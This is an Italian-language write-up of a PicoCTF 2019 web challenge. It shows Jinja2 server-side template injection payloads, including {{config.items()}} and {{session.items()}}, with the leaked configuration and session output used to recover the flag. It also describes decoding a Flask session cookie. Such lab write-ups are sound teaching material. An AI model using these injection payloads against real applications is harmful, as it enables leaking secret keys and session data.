---
tags:
  - WebExploitation
  - PicoCTF2019
---


## Problema 

Well done, Agent 513! Our sources say Evil Empire Co is passing secrets around when you log in: [link](https://2019shell1.picoctf.com/problem/10833/), can you help us find it? or http://2019shell1.picoctf.com:10833

## Soluzione

Dopo la consueta registrazione, provo a attaccare con apice `'` i TODO come in Empire1 ma vedo che questa volta viene parsato correttamente.
Proviamo un attacco di [template injection](https://portswigger.net/research/server-side-template-injection) mettendo il seguente codice nei TODO
```
{{ 7 * 7 }}
```
Ottengo 49. Funziona!
Provo con
```
{{self}}
```
e ottengo
```
<TemplateReference None>
```
Provo con
```
{{7 * '7'}}
```
e ottengo
```
7777777
```
Con un po' di ricerche sull'internet ottengo che il motore di template è **Jinja2**.
In questi casi la prima cosa da provare è leggerne le config per avere qualche informazione addizionale, eseguo:
```
{{config.items()}}
```
Ottengo:
```
Very Urgent: dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', 'picoCTF{your_flag_is_in_another_castle12345678}'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_POOL_SIZE', None), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_POOL_RECYCLE', None), ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('SQLALCHEMY_ENGINE_OPTIONS', {}), ('BOOTSTRAP_USE_MINIFIED', True), ('BOOTSTRAP_CDN_FORCE_SSL', False), ('BOOTSTRAP_QUERYSTRING_REVVING', True), ('BOOTSTRAP_SERVE_LOCAL', False), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None)])
```
Da qui trovo la SECRET_KEY
```
picoCTF{your_flag_is_in_another_castle12345678}
```
che però non funziona!
Provo a vedere le variabili di ambiente di flask da [questo](https://flask.palletsprojects.com/en/1.1.x/templating/#standard-context) link, proviamo con:
```
{{session.items()}}
```
e otteniamo:
```
Very Urgent: dict_items([('_fresh', True), ('_id', 'e158b0de9e526f3ac153dcdf248dda884144b2e75231044c19d787cb04a44dc89ea5ae89a59d76efa4f5ced1a8cc0df572c54d59effaad2144069cdc8d5179f0'), ('csrf_[[token]]', '03046f52e77982f7a7dc626c9d8295d76f6085ec'), ('dark_secret', 'picoCTF{its_a_me_your_flagf3d56a8a}'), ('user_id', '5')])
```
Trovata! La flag è:
```
picoCTF{its_a_me_your_flagf3d56a8a}
```

### Alternativa

Esiste un tool per decodificare i cookie di sessione di Flask, si trova [qui](https://www.kirsle.net/wizards/flask-session.cgi), inserendo il cookie session che trovo ottengo:
```
{
    "_fresh": true,
    "_id": "8cd7ed88b8f2634ebe13cbb6c321c3090c11254effbb99924bf9037639c9fda127643b8e1c4ba5257fce7a193639ae2f5e2911ece327e48e43b386ef65618709",
    "csrf_[[token]]": "bf1d1303f409590730443f12541c77cdb97811e8",
    "dark_secret": "picoCTF{its_a_me_your_flag3f43252e}",
    "user_id": "3"
}
```
